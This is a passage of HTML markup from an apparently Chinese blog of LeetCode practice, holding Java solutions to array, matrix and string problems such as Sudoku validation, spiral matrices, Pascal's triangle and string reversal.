class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isValidSudoku</span><span class="params">(<span class="keyword">char</span>[][] board)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[][] rows = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">9</span>][<span class="number">9</span>];</span><br><span class="line">        <span class="keyword">int</span>[][] columns = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">9</span>][<span class="number">9</span>];</span><br><span class="line">        <span class="keyword">int</span>[][][] subboxes = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">3</span>][<span class="number">3</span>][<span class="number">9</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">9</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">9</span>; j++) &#123;</span><br><span class="line">                <span class="keyword">char</span> c = board[i][j];</span><br><span class="line">                <span class="keyword">if</span> (c != <span class="string">'.'</span>) &#123;</span><br><span class="line">                    <span class="keyword">int</span> index = c - <span class="string">'0'</span> - <span class="number">1</span>;</span><br><span class="line">                    rows[i][index]++;</span><br><span class="line">                    columns[j][index]++;</span><br><span class="line">                    subboxes[i / <span class="number">3</span>][j / <span class="number">3</span>][index]++;</span><br><span class="line">                    <span class="keyword">if</span> (rows[i][index] &gt; <span class="number">1</span> || columns[j][index] &gt; <span class="number">1</span> || subboxes[i / <span class="number">3</span>][j / <span class="number">3</span>][index] &gt; <span class="number">1</span>) &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-矩阵置零"><a href="#5-矩阵置零" class="headerlink" title="5. 矩阵置零"></a>5. 矩阵置零</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setZeroes</span><span class="params">(<span class="keyword">int</span>[][] matrix)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> m = matrix.length, n = matrix[<span class="number">0</span>].length;</span><br><span class="line">        <span class="keyword">boolean</span>[] row = <span class="keyword">new</span> <span class="keyword">boolean</span>[m];</span><br><span class="line">        <span class="keyword">boolean</span>[] col = <span class="keyword">new</span> <span class="keyword">boolean</span>[n];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (matrix[i][j] == <span class="number">0</span>) &#123;</span><br><span class="line">                    row[i] = col[j] = <span class="keyword">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (row[i] || col[j]) &#123;</span><br><span class="line">                    matrix[i][j] = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-螺旋矩阵"><a href="#6-螺旋矩阵" class="headerlink" title="6. 螺旋矩阵"></a>6. 螺旋矩阵</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">spiralOrder</span><span class="params">(<span class="keyword">int</span>[][] matrix)</span> </span>&#123;</span><br><span class="line">        List&lt;Integer&gt; order = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">        <span class="keyword">if</span> (matrix == <span class="keyword">null</span> || matrix.length == <span class="number">0</span> || matrix[<span class="number">0</span>].length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> order;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> rows = matrix.length, columns = matrix[<span class="number">0</span>].length;</span><br><span class="line">        <span class="keyword">boolean</span>[][] visited = <span class="keyword">new</span> <span class="keyword">boolean</span>[rows][columns];</span><br><span class="line">        <span class="keyword">int</span> total = rows * columns;</span><br><span class="line">        <span class="keyword">int</span> row = <span class="number">0</span>, column = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span>[][] directions = &#123;&#123;<span class="number">0</span>, <span class="number">1</span>&#125;, &#123;<span class="number">1</span>, <span class="number">0</span>&#125;, &#123;<span class="number">0</span>, -<span class="number">1</span>&#125;, &#123;-<span class="number">1</span>, <span class="number">0</span>&#125;&#125;;</span><br><span class="line">        <span class="keyword">int</span> directionIndex = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; total; i++) &#123;</span><br><span class="line">            order.add(matrix[row][column]);</span><br><span class="line">            visited[row][column] = <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">int</span> nextRow = row + directions[directionIndex][<span class="number">0</span>], nextColumn = column + directions[directionIndex][<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span> (nextRow &lt; <span class="number">0</span> || nextRow &gt;= rows || nextColumn &lt; <span class="number">0</span> || nextColumn &gt;= columns || visited[nextRow][nextColumn]) &#123;</span><br><span class="line">                directionIndex = (directionIndex + <span class="number">1</span>) % <span class="number">4</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            row += directions[directionIndex][<span class="number">0</span>];</span><br><span class="line">            column += directions[directionIndex][<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> order;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="7-螺旋矩阵二"><a href="#7-螺旋矩阵二" class="headerlink" title="7. 螺旋矩阵二"></a>7. 螺旋矩阵二</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[][] generateMatrix(<span class="keyword">int</span> n) &#123;</span><br><span class="line">        <span class="keyword">int</span> maxNum = n * n;</span><br><span class="line">        <span class="keyword">int</span> curNum = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span>[][] matrix = <span class="keyword">new</span> <span class="keyword">int</span>[n][n];</span><br><span class="line">        <span class="keyword">int</span> row = <span class="number">0</span>, column = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span>[][] directions = &#123;&#123;<span class="number">0</span>, <span class="number">1</span>&#125;, &#123;<span class="number">1</span>, <span class="number">0</span>&#125;, &#123;<span class="number">0</span>, -<span class="number">1</span>&#125;, &#123;-<span class="number">1</span>, <span class="number">0</span>&#125;&#125;; <span class="comment">// 右下左上</span></span><br><span class="line">        <span class="keyword">int</span> directionIndex = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (curNum &lt;= maxNum) &#123;</span><br><span class="line">            matrix[row][column] = curNum;</span><br><span class="line">            curNum++;</span><br><span class="line">            <span class="keyword">int</span> nextRow = row + directions[directionIndex][<span class="number">0</span>], nextColumn = column + directions[directionIndex][<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span> (nextRow &lt; <span class="number">0</span> || nextRow &gt;= n || nextColumn &lt; <span class="number">0</span> || nextColumn &gt;= n || matrix[nextRow][nextColumn] != <span class="number">0</span>) &#123;</span><br><span class="line">                directionIndex = (directionIndex + <span class="number">1</span>) % <span class="number">4</span>; <span class="comment">// 顺时针旋转至下一个方向</span></span><br><span class="line">            &#125;</span><br><span class="line">            row = row + directions[directionIndex][<span class="number">0</span>];</span><br><span class="line">            column = column + directions[directionIndex][<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> matrix;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="8-对角线遍历"><a href="#8-对角线遍历" class="headerlink" title="8. 对角线遍历"></a>8. 对角线遍历</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] findDiagonalOrder(<span class="keyword">int</span>[][] matrix) &#123;</span><br><span class="line">        <span class="keyword">if</span> (matrix.length == <span class="number">0</span>) <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> m = matrix.length;</span><br><span class="line">        <span class="keyword">int</span> n = matrix[<span class="number">0</span>].length;</span><br><span class="line">        <span class="keyword">int</span>[][] dirs = &#123;&#123;-<span class="number">1</span>, <span class="number">1</span>&#125;, &#123;<span class="number">1</span>, -<span class="number">1</span>&#125;&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> row = <span class="number">0</span>, col = <span class="number">0</span>, di = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span>[] result = <span class="keyword">new</span> <span class="keyword">int</span>[m * n];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m * n; i++) &#123;</span><br><span class="line">            result[i] = matrix[row][col];</span><br><span class="line"></span><br><span class="line">            row = row + dirs[di][<span class="number">0</span>];</span><br><span class="line">            col = col + dirs[di][<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (col &gt;= n) &#123;col = n - <span class="number">1</span>; row += <span class="number">2</span>; di = <span class="number">1</span> - di;&#125;</span><br><span class="line">            <span class="keyword">if</span> (row &gt;= m) &#123;row = m - <span class="number">1</span>; col += <span class="number">2</span>; di = <span class="number">1</span> - di;&#125;</span><br><span class="line">            <span class="keyword">if</span> (row &lt; <span class="number">0</span>) &#123;row = <span class="number">0</span>; di = <span class="number">1</span> - di;&#125;</span><br><span class="line">            <span class="keyword">if</span> (col &lt; <span class="number">0</span>) &#123;col = <span class="number">0</span>; di = <span class="number">1</span> - di;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="9-杨辉三角"><a href="#9-杨辉三角" class="headerlink" title="9. 杨辉三角"></a>9. 杨辉三角</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    public List&lt;List&lt;Integer&gt;&gt; generate(int numRows) &#123;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; ret = <span class="keyword">new</span> ArrayList&lt;List&lt;Integer&gt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (int i = <span class="number">0</span>; i &lt; numRows; ++i) &#123;</span><br><span class="line">            List&lt;Integer&gt; row = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">            <span class="keyword">for</span> (int j = <span class="number">0</span>; j &lt;= i; ++j) &#123;</span><br><span class="line">                <span class="keyword">if</span> (j == <span class="number">0</span> || j == i) &#123;</span><br><span class="line">                    row.add(<span class="number">1</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    row.add(ret.get(i - <span class="number">1</span>).get(j - <span class="number">1</span>) + ret.get(i - <span class="number">1</span>).get(j));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            ret.add(row);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="10-杨辉三角二"><a href="#10-杨辉三角二" class="headerlink" title="10. 杨辉三角二"></a>10. 杨辉三角二</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//滚动数组</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">getRow</span><span class="params">(<span class="keyword">int</span> rowIndex)</span> </span>&#123;</span><br><span class="line">        List&lt;Integer&gt; pre = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= rowIndex; ++i) &#123;</span><br><span class="line">            List&lt;Integer&gt; cur = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= i; ++j) &#123;</span><br><span class="line">                <span class="keyword">if</span> (j == <span class="number">0</span> || j == i) &#123;</span><br><span class="line">                    cur.add(<span class="number">1</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    cur.add(pre.get(j - <span class="number">1</span>) + pre.get(j));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            pre = cur;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> pre;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="刷题第四天"><a href="#刷题第四天" class="headerlink" title="刷题第四天"></a>刷题第四天</h2><h3 id="1-实现-strStr"><a href="#1-实现-strStr" class="headerlink" title="1, 实现 strStr()"></a>1, 实现 strStr()</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//暴力解法</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">strStr</span><span class="params">(String haystack, String needle)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = haystack.length(), m = needle.length();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i + m &lt;= n; i++) &#123;</span><br><span class="line">            <span class="keyword">boolean</span> flag = <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; m; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (haystack.charAt(i + j) != needle.charAt(j)) &#123;</span><br><span class="line">                    flag = <span class="keyword">false</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (flag) &#123;</span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-重复的子字符串"><a href="#2-重复的子字符串" class="headerlink" title="2. 重复的子字符串"></a>2. 重复的子字符串</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//双指针模拟</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">repeatedSubstringPattern</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = s.length();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i * <span class="number">2</span> &lt;= n; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (n % i == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">boolean</span> match = <span class="keyword">true</span>;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> j = i; j &lt; n; ++j) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (s.charAt(j) != s.charAt(j - i)) &#123;</span><br><span class="line">                        match = <span class="keyword">false</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (match) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-字符串反转"><a href="#3-字符串反转" class="headerlink" title="3. 字符串反转"></a>3. 字符串反转</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">reverseString</span><span class="params">(<span class="keyword">char</span>[] s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = s.length;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> left = <span class="number">0</span>, right = n - <span class="number">1</span>; left &lt; right; left++, right--)&#123;</span><br><span class="line">            <span class="keyword">char</span> tmp = s[left];</span><br><span class="line">            s[left] = s[right];</span><br><span class="line">            s[right] = tmp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-反转字符串中的元音字母"><a href="#4-反转字符串中的元音字母" class="headerlink" title="4. 反转字符串中的元音字母"></a>4. <a href="https://leetcode-cn.com/problems/reverse-vowels-of-a-string/" target="_blank" rel="noopener">反转字符串中的元音字母</a></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">reverseVowels</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = s.length();</span><br><span class="line">        <span class="keyword">char</span>[] arr = s.toCharArray();</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>, j = n - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; j) &#123;</span><br><span class="line">            <span class="keyword">while</span> (i &lt; n &amp;&amp; !isVowel(arr[i])) &#123;</span><br><span class="line">                ++i;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> (j &gt; <span class="number">0</span> &amp;&amp; !isVowel(arr[j])) &#123;</span><br><span class="line">                --j;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (i &lt; j) &#123;</span><br><span class="line">                swap(arr, i, j);</span><br><span class="line">                ++i;</span><br><span class="line">                --j;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> String(arr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isVowel</span><span class="params">(<span class="keyword">char</span> ch)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"aeiouAEIOU"</span>.indexOf(ch) &gt;= <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">char</span>[] arr, <span class="keyword">int</span> i, <span class="keyword">int</span> j)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">char</span> temp = arr[i];</span><br><span class="line">        arr[i] = arr[j];</span><br><span class="line">        arr[j] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-删去字符串的元音字母"><a href="#5-删去字符串的元音字母" class="headerlink" title="5. 删去字符串的元音字母"></a>5. 删去字符串的元音字母</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">remove</span><span class="params">(String s)</span></span>&#123;</span><br><span class="line">    StringBuilder res = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">char</span> c : s.toCharArray())&#123;</span><br><span class="line">        <span class="keyword">if</span>(!isVowel(c))&#123;</span><br><span class="line">            res.append(c);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res.toString();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isVowel</span><span class="params">(<span class="keyword">char</span> ch)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"aeiouAEIOU"</span>.indexOf(ch) &gt;= <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-反转字符串二"><a href="#6-反转字符串二" class="headerlink" title="6. 反转字符串二"></a>6. 反转字符串二</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">reverseStr</span><span class="params">(String s, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = s.length();</span><br><span class="line">        <span class="keyword">char</span>[] arr = s.toCharArray();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i += <span class="number">2</span> * k) &#123;</span><br><span class="line">            reverse(arr, i, Math.min(i + k, n) - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> String(arr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">reverse</span><span class="params">(<span class="keyword">char</span>[] arr, <span class="keyword">int</span> left, <span class="keyword">int</span> right)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">            <span class="keyword">char</span> temp = arr[left];</span><br><span class="line">            arr[left] = arr[right];</span><br><span class="line">            arr[right] = temp;</span><br><span class="line">            left++;</span><br><span class="line">            right--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="7-反转字符串中的单词-III"><a href="#7-反转字符串中的单词-III" class="headerlink" title="7. 反转字符串中的单词 III"></a>7. <a href="https://leetcode-cn.com/problems/reverse-words-in-a-string-iii/" target="_blank" rel="noopener">反转字符串中的单词 III</a></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 